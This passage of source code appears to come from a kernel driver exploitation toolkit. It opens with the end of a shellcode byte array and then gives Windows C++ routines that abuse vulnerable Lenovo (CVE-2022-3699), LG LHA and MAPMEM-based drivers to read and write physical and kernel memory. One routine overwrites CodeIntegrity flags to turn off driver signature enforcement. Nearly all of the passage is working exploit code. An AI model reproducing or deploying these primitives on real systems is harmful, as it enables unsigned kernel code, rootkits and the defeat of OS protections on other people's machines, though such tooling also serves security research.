    0x8B, 0x48, 0x0C, 0x58, 0x8B, 0x09, 0x83, 0xE8, 0x01, 0x75, 0xF9, 0x8B, 0x49, 0x18, 0xE8, 0x0C,
    0x00, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x06, 0x8D, 0x4D, 0xF8, 0x51, 0xFF, 0xD0, 0xC9, 0xC3, 0x55,
    0x8B, 0xEC, 0x83, 0xEC, 0x10, 0x53, 0x57, 0x8B, 0xF9, 0x8B, 0x47, 0x3C, 0x8B, 0x44, 0x38, 0x78,
    0x03, 0xC7, 0x8B, 0x48, 0x1C, 0x8B, 0x58, 0x20, 0x03, 0xCF, 0x89, 0x4D, 0xF0, 0x03, 0xDF, 0x8B,
    0x48, 0x24, 0x8B, 0x40, 0x18, 0x03, 0xCF, 0x89, 0x4D, 0xF4, 0x33, 0xC9, 0x89, 0x5D, 0xF8, 0x8B,
    0xD1, 0x89, 0x45, 0xFC, 0x85, 0xC0, 0x74, 0x41, 0x56, 0x8B, 0x34, 0x93, 0x8B, 0xD9, 0x03, 0xF7,
    0x8A, 0x06, 0x84, 0xC0, 0x74, 0x18, 0x0F, 0xBE, 0xC0, 0x33, 0xD8, 0xC1, 0xC3, 0x03, 0x43, 0x46,
    0x8A, 0x06, 0x84, 0xC0, 0x75, 0xF0, 0x81, 0xFB, 0x08, 0x7E, 0xB3, 0x69, 0x74, 0x0B, 0x42, 0x3B,
    0x55, 0xFC, 0x73, 0x14, 0x8B, 0x5D, 0xF8, 0xEB, 0xD0, 0x8B, 0x45, 0xF4, 0x8B, 0x4D, 0xF0, 0x0F,
    0xB7, 0x04, 0x50, 0x8B, 0x0C, 0x81, 0x03, 0xCF, 0x5E, 0x5F, 0x8B, 0xC1, 0x5B, 0xC9, 0xC3
};

```

`Source/Hamakaze/idrv/lenovo.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       LENOVO.CPP
*
*  VERSION:     1.31
*
*  DATE:        09 Apr 2023
*
*  Lenovo driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/lenovo.h"

//
// Based on CVE-2022-3699.
//

static PHYSICAL_ADDRESS g_LddSwapAddress;
static ULONG_PTR g_MiPteBase;

BOOL LddReadVirtualAddressPrimitive(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* Value);

#define LDD_CHECK_DATA_SIZE(Size) \
    switch (Size) { \
    case 1: \
    case 2: \
    case 4: \
    case 8: \
        break; \
    default: \
        SetLastError(ERROR_INVALID_PARAMETER); \
        return FALSE;\
    }\

/*
* LddpVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI LddpVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    MMPTE PageTableEntry;
    PAGE_TYPE PageType;
    MI_PTE_HIERARCHY PteHierarchy = { 0, 0, 0, 0 };

    supCreatePteHierarchy(VirtualAddress, &PteHierarchy, g_MiPteBase);

    PageTableEntry.Value = 0;

    LddReadVirtualAddressPrimitive(DeviceHandle,
        PteHierarchy.PTE,
        &PageTableEntry.Value);

    if (PageTableEntry.Value == 0) {

        LddReadVirtualAddressPrimitive(DeviceHandle,
            PteHierarchy.PDE,
            &PageTableEntry.Value);

        PageType = PageTypePde;
    }
    else {
        PageType = PageTypePte;
    }

    switch (PageType) {
    case PageTypePte:
        VirtualAddress &= 0xfff;
        break;
    case PageTypePde:
        VirtualAddress &= 0x1fffff;
        break;
    default:
        *PhysicalAddress = 0;
        return FALSE;
    }

    *PhysicalAddress = (PageTableEntry.HardwarePte.PageFrameNumber << 12) + VirtualAddress;

    return TRUE;
}

/*
* LddReadPhysicalMemoryPrimitive
*
* Purpose:
*
* Basic physical memory read primitive.
*
*/
BOOL LddReadPhysicalMemoryPrimitive(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ ULONG Size,
    _Out_ ULONG_PTR* Value)
{
    BOOL bResult = FALSE;
    ULONG_PTR value = 0;
    LDD_READ_REQUEST request;

    *Value = 0;

    LDD_CHECK_DATA_SIZE(Size);

    RtlSecureZeroMemory(&request, sizeof(request));

    request.Address.QuadPart = Address;
    request.Size = Size;

    bResult = supCallDriver(DeviceHandle,
        IOCTL_LDD_READ_PHYSICAL_MEMORY,
        &request,
        sizeof(LDD_READ_REQUEST),
        &value,
        sizeof(value));

    *Value = value;

    return bResult;
}

/*
* LddWritePhysicalMemoryPrimitive
*
* Purpose:
*
* Basic physical memory write primitive.
*
*/
BOOL LddWritePhysicalMemoryPrimitive(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ DWORD Size,
    _In_ ULONG_PTR Value)
{
    LDD_WRITE_REQUEST request;

    LDD_CHECK_DATA_SIZE(Size);

    RtlSecureZeroMemory(&request, sizeof(request));

    request.Address.QuadPart = Address;
    request.Size = Size;
    request.Data = Value;

    return supCallDriver(DeviceHandle,
        IOCTL_LDD_WRITE_PHYSICAL_MEMORY,
        &request,
        sizeof(LDD_WRITE_REQUEST),
        NULL,
        0);
}

/*
* LddReadVirtualAddressPrimitive
*
* Purpose:
*
* Read value from the virtual address.
*
*/
BOOL LddReadVirtualAddressPrimitive(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* Value
)
{
    *Value = 0;

    //
    // Write virtual address to the our address swap area.
    // Lenovo driver expects value to be a pointer so it will dereference 
    // value and write result to the given physical address.
    // 
    // Thus we will be able to read km address value from physical memory back.
    //
    if (!LddWritePhysicalMemoryPrimitive(DeviceHandle,
        g_LddSwapAddress.QuadPart,
        sizeof(ULONG_PTR),
        VirtualAddress))
    {
        return FALSE;
    }

    //
    // Read result.
    //
    return LddReadPhysicalMemoryPrimitive(DeviceHandle,
        g_LddSwapAddress.QuadPart,
        sizeof(ULONG_PTR),
        Value);

}

/*
* LddReadWritePhysicalMemoryStub
*
* Purpose:
*
* Stub.
*
*/
BOOL WINAPI LddReadWritePhysicalMemoryStub(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    UNREFERENCED_PARAMETER(DeviceHandle);
    UNREFERENCED_PARAMETER(PhysicalAddress);
    UNREFERENCED_PARAMETER(Buffer);
    UNREFERENCED_PARAMETER(NumberOfBytes);

    SetLastError(ERROR_CALL_NOT_IMPLEMENTED);
    return FALSE;
}

/*
* LddReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
_Success_(return != FALSE)
BOOL WINAPI LddReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ULONG_PTR physAddress = 0;

    PBYTE BufferPtr = (PBYTE)Buffer;

    if (!LddpVirtualToPhysical(DeviceHandle, Address, &physAddress))
        return FALSE;

    ULONG_PTR address = physAddress, tmpValue;
    ULONG readBytes = 0;
    BYTE valueRead;

    for (ULONG i = 0; i < NumberOfBytes; i++) {

        valueRead = 0;
        tmpValue = 0;
        if (!LddReadPhysicalMemoryPrimitive(DeviceHandle,
            address,
            sizeof(valueRead),
            &tmpValue))
        {
            break;
        }

        valueRead = (BYTE)tmpValue;

        BufferPtr[i] = valueRead;
        address += sizeof(valueRead);
        readBytes += sizeof(valueRead);
    }

    return (readBytes == NumberOfBytes);
}

/*
* LddWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI LddWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ULONG_PTR physAddress = 0;

    PBYTE BufferPtr = (PBYTE)Buffer;

    if (!LddpVirtualToPhysical(DeviceHandle, Address, &physAddress))
        return FALSE;

    ULONG_PTR address = physAddress;
    ULONG writeBytes = 0;
    BYTE valueWrite;

    for (ULONG i = 0; i < NumberOfBytes; i++) {

        valueWrite = BufferPtr[i];
        if (!LddWritePhysicalMemoryPrimitive(DeviceHandle,
            address,
            sizeof(valueWrite),
            (ULONG_PTR)&valueWrite))
        {
            break;
        }

        address += sizeof(valueWrite);
        writeBytes += sizeof(valueWrite);
    }

    return (writeBytes == NumberOfBytes);
}

/*
* LddpFindSwapAddress
*
* Purpose:
*
* Locate first zero 8 bytes in first megabyte of RAM to use it for pointers dereference later.
*
*/
ULONG_PTR LddpFindSwapAddress(
    _In_ HANDLE DeviceHandle
)
{
    ULONG_PTR currentAddress = 0x1000;
    ULONG_PTR endAddress = 0x10000;
    ULONG_PTR probedValue;

    while (currentAddress < endAddress) {

        if (LddReadPhysicalMemoryPrimitive(DeviceHandle,
            currentAddress,
            sizeof(ULONG_PTR),
            &probedValue))
        {
            if (probedValue == 0)
                return currentAddress;
        }
        else {
            break;
        }

        currentAddress += sizeof(ULONG_PTR);
    }

    return 0;
}

/*
* LddControlDSE
*
* Purpose:
*
* Change Windows CodeIntegrity flags using physical memory write.
*
*/
BOOL LddControlDSE(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address
)
{
    BOOL bResult = FALSE;
    HANDLE deviceHandle = Context->DeviceHandle;
    ULONG_PTR physAddress = 0;
    ULONG_PTR dseValue = DSEValue;

    printf_s("[+] DSE flags (0x%p) new value to be written: %lX\r\n",
        (PVOID)Address,
        DSEValue);

    if (!LddpVirtualToPhysical(deviceHandle, Address, &physAddress))
        return FALSE;

    if (LddWritePhysicalMemoryPrimitive(deviceHandle,
        physAddress,
        sizeof(dseValue),
        (ULONG_PTR)&dseValue))
    {
        printf_s("[+] Kernel memory write complete, verifying data\r\n");

        if (LddReadPhysicalMemoryPrimitive(deviceHandle,
            physAddress,
            sizeof(dseValue),
            &dseValue))
        {
            bResult = (DSEValue == dseValue);
            supPrintfEvent(
                (bResult == FALSE) ? kduEventError : kduEventInformation,
                "%s Write result verification %s\r\n",
                (bResult == FALSE) ? "[!]" : "[+]",
                (bResult == FALSE) ? "failed" : "succeeded");
        }
        else {
            supPrintfEvent(kduEventError,
                "[!] Could not verify kernel memory write\r\n");

        }
    }
    else {
        supPrintfEvent(kduEventError,
            "[!] Error while writing to the kernel memory\r\n");
    }

    return bResult;
}

/*
* LddRegisterDriver
*
* Purpose:
*
* Find address for swap, MiPteBase and it value.
*
*/
BOOL WINAPI LddRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    UNREFERENCED_PARAMETER(Param);

    ULONG_PTR address;

    g_LddSwapAddress.QuadPart = LddpFindSwapAddress(DeviceHandle);
    if (g_LddSwapAddress.QuadPart) {
        printf_s("[+] Physical address used for address swaps: 0x%llX.\r\n", g_LddSwapAddress.QuadPart);
    }

    g_MiPteBase = 0;
    address = supResolveMiPteBaseAddress(NULL);
    if (address) {
        if (LddReadVirtualAddressPrimitive(DeviceHandle, address, &g_MiPteBase)) {
            printf_s("[+] Found MiPteBase at 0x%llX, value: 0x%llX\r\n",
                address,
                g_MiPteBase);
        }
    }

    return (g_MiPteBase != NULL && g_LddSwapAddress.QuadPart != 0);
}

```

`Source/Hamakaze/idrv/lenovo.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       LENOVO.H
*
*  VERSION:     1.31
*
*  DATE:        08 Apr 2023
*
*  Lenovo driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once


#define LENOVO_DEVICE_TYPE       (DWORD)FILE_DEVICE_UNKNOWN

#define LDD_READ_PHYSMEM_FUNCID  (DWORD)0x804
#define LDD_WRITE_PHYSMEM_FUNCID (DWORD)0x805


#define IOCTL_LDD_READ_PHYSICAL_MEMORY      \
    CTL_CODE(LENOVO_DEVICE_TYPE, LDD_READ_PHYSMEM_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x222010

#define IOCTL_LDD_WRITE_PHYSICAL_MEMORY    \
    CTL_CODE(LENOVO_DEVICE_TYPE, LDD_WRITE_PHYSMEM_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x222014

typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT) _LDD_READ_REQUEST {
    PHYSICAL_ADDRESS Address;
    ULONG Size; // 1, 2, 4, 8 bytes
} LDD_READ_REQUEST, * PLDD_READ_REQUEST;

typedef struct _LDD_WRITE_REQUEST {
    PHYSICAL_ADDRESS Address;
    ULONG Size; // 1, 2, 4, 8 bytes
    ULONG Unused; //align
    ULONG_PTR Data; //pointer to data
} LDD_WRITE_REQUEST, * PLDD_WRITE_REQUEST;

BOOL WINAPI LddReadWritePhysicalMemoryStub(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI LddRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param);

BOOL WINAPI LddpVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

BOOL LddControlDSE(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address);

_Success_(return != FALSE)
BOOL WINAPI LddReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI LddWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

```

`Source/Hamakaze/idrv/lha.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2021
*
*  TITLE:       LHA.CPP
*
*  VERSION:     1.11
*
*  DATE:        19 Apr 2021
*
*  LG LHA driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/lha.h"

//
// WARNING, (BUG)FEATURE ALERT
// 
// LG crapware does not check API call results.
// This will eventually lead to BSOD in case of mapping failure.
//

/*
* LHAReadPhysicalMemory
*
* Purpose:
*
* Read physical memory through MmMapIoSpace.
*
*/
BOOL WINAPI LHAReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    LHA_READ_PHYSICAL_MEMORY request;

    request.Address = PhysicalAddress;
    request.Size = NumberOfBytes;

    return supCallDriver(DeviceHandle,
        IOCTL_LHA_READ_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        Buffer,
        NumberOfBytes);
}

/*
* LHAWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI LHAWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    SIZE_T size;
    ULONG value;
    DWORD dwError = ERROR_SUCCESS;
    LHA_WRITE_PHYSICAL_MEMORY* pRequest;

    value = FIELD_OFFSET(LHA_WRITE_PHYSICAL_MEMORY, Data) + NumberOfBytes;
    size = ALIGN_UP_BY(value, PAGE_SIZE);

    pRequest = (LHA_WRITE_PHYSICAL_MEMORY*)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (pRequest) {

        pRequest->Address = PhysicalAddress;
        pRequest->Size = NumberOfBytes;
        RtlCopyMemory(&pRequest->Data, Buffer, NumberOfBytes);

        bResult = supCallDriver(DeviceHandle,
            IOCTL_LHA_WRITE_PHYSICAL_MEMORY,
            pRequest,
            (ULONG)size,
            NULL,
            0);

        if (!bResult)
            dwError = GetLastError();

        supFreeLockedMemory(pRequest, size);
    }

    SetLastError(dwError);
    return bResult;
}

/*
* LHAQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI LHAQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    DWORD dwError = ERROR_SUCCESS;
    ULONG_PTR PML4 = 0;
    UCHAR* pbLowStub1M;
    DWORD cbRead = 0x100000;

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    do {

        pbLowStub1M = (UCHAR*)supHeapAlloc(cbRead);
        if (pbLowStub1M == NULL) {
            dwError = GetLastError();
            break;
        }

        for (ULONG_PTR i = 0; i < cbRead; i += PAGE_SIZE) {

            if (!LHAReadPhysicalMemory(DeviceHandle,
                i,
                RtlOffsetToPointer(pbLowStub1M, i),
                PAGE_SIZE))
            {
                dwError = GetLastError();
                break;
            }

        }

        if (dwError == ERROR_SUCCESS) {

            PML4 = supGetPML4FromLowStub1M((ULONG_PTR)pbLowStub1M);
            if (PML4)
                *Value = PML4;

        }

    } while (FALSE);

    if (pbLowStub1M)
        supHeapFree(pbLowStub1M);

    SetLastError(dwError);
    return (PML4 != 0);
}

/*
* LHAVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI LHAVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        LHAQueryPML4Value,
        LHAReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* LHAReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI LHAReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = LHAVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = LHAReadPhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes);

    }

    return bResult;
}

/*
* LHAWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI LHAWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = LHAVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = LHAWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes);

    }

    return bResult;
}

```

`Source/Hamakaze/idrv/lha.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2021
*
*  TITLE:       LHA.H
*
*  VERSION:     1.10
*
*  DATE:        03 Apr 2021
*
*  LG LHA driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// LG LHA driver interface.
//

#define LHA_DEVICE_TYPE          (DWORD)0x9C40

#define LHA_READ_PHYSMEM_FUNCID  (DWORD)0xBF6
#define LHA_WRITE_PHYSMEM_FUNCID (DWORD)0xBF7


#define IOCTL_LHA_READ_PHYSICAL_MEMORY      \
    CTL_CODE(LHA_DEVICE_TYPE, LHA_READ_PHYSMEM_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x9C402FD8

#define IOCTL_LHA_WRITE_PHYSICAL_MEMORY    \
    CTL_CODE(LHA_DEVICE_TYPE, LHA_WRITE_PHYSMEM_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x9C402FDC

#pragma pack(push,4)

typedef struct _LHA_READ_PHYSICAL_MEMORY {
    ULONG_PTR Address;
    ULONG Size;
} LHA_READ_PHYSICAL_MEMORY, * PLHA_READ_PHYSICAL_MEMORY;

#pragma pack(pop)

typedef struct _LHA_WRITE_PHYSICAL_MEMORY {
    ULONG_PTR Address;
    ULONG Size;
    UCHAR Data[ANYSIZE_ARRAY];
} LHA_WRITE_PHYSICAL_MEMORY, * PLHA_WRITE_PHYSICAL_MEMORY;

BOOL WINAPI LHAReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI LHAWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI LHAQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value);

BOOL WINAPI LHAVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

BOOL WINAPI LHAReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI LHAWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

```

`Source/Hamakaze/idrv/mapmem.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2022
*
*  TITLE:       MAPMEM.CPP
*
*  VERSION:     1.26
*
*  DATE:        15 Oct 2022
*
*  MAPMEM driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/mapmem.h"

//
// Gigabyte/CODESYS/SuperBMC/etc drivers are based on MAPMEM.SYS Microsoft Windows NT 3.51 DDK example from 1993.
//

ULONG g_MapMem_MapIoctl;
ULONG g_MapMem_UnmapIoctl;

/*
* MapMemMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID MapMemMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes)
{
    PVOID pMapSection = NULL;
    MAPMEM_PHYSICAL_MEMORY_INFO request;
    ULONG_PTR offset;
    ULONG mapSize;

    RtlSecureZeroMemory(&request, sizeof(request));

    offset = PhysicalAddress & ~(PAGE_SIZE - 1);
    mapSize = (ULONG)(PhysicalAddress - offset) + NumberOfBytes;

    request.BusAddress.QuadPart = offset;
    request.Length = mapSize;

    if (supCallDriver(DeviceHandle,
        g_MapMem_MapIoctl,
        &request,
        sizeof(request),
        (PVOID)&pMapSection,
        sizeof(PVOID)))
    {
        return pMapSection;
    }

    return NULL;
}

/*
* MapMemUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID MapMemUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap
)
{
    supCallDriver(DeviceHandle,
        g_MapMem_UnmapIoctl,
        &SectionToUnmap,
        sizeof(PVOID),
        NULL,
        0);
}

/*
* GioVirtualToPhysicalEx
*
* Purpose:
*
* Translate virtual address to the physical.
*
* WARNING:
* RED ALERT, GDRV always(!) truncates physical address to 4 bytes. DO NOT USE.
*
*/
BOOL WINAPI GioVirtualToPhysicalEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    GIO_VIRTUAL_TO_PHYSICAL request;

    if (PhysicalAddress)
        *PhysicalAddress = 0;
    else {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    request.Address.QuadPart = VirtualAddress;

    if (supCallDriver(DeviceHandle,
        IOCTL_GDRV_VIRTUALTOPHYSICAL,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *PhysicalAddress = request.Address.LowPart;
        bResult = TRUE;
    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* MapMemQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI MapMemQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    DWORD cbRead = 0x100000;
    ULONG_PTR pbLowStub1M = 0, PML4 = 0;

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    pbLowStub1M = (ULONG_PTR)MapMemMapMemory(DeviceHandle,
        0ULL,
        cbRead);

    if (pbLowStub1M) {

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;

        MapMemUnmapMemory(DeviceHandle, (PVOID)pbLowStub1M);

    }

    return (PML4 != 0);
}

/*
* MapMemVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI MapMemVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        MapMemQueryPML4Value,
        MapMemReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* MapMemReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI MapMemReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;

    ULONG_PTR offset;

    //
    // Map physical memory section.
    //
    mappedSection = MapMemMapMemory(DeviceHandle,
        PhysicalAddress,
        NumberOfBytes);

    if (mappedSection) {

        offset = PhysicalAddress - (PhysicalAddress & ~(PAGE_SIZE - 1));

        __try {

            if (DoWrite) {
                RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
            }
            else {
                RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        //
        // Unmap physical memory section.
        //
        MapMemUnmapMemory(
            DeviceHandle,
            mappedSection);

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* MapMemReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI MapMemReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return MapMemReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* MapMemWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI MapMemWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return MapMemReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* MapMemWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory via GDRV.
*
*/
BOOL WINAPI MapMemWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
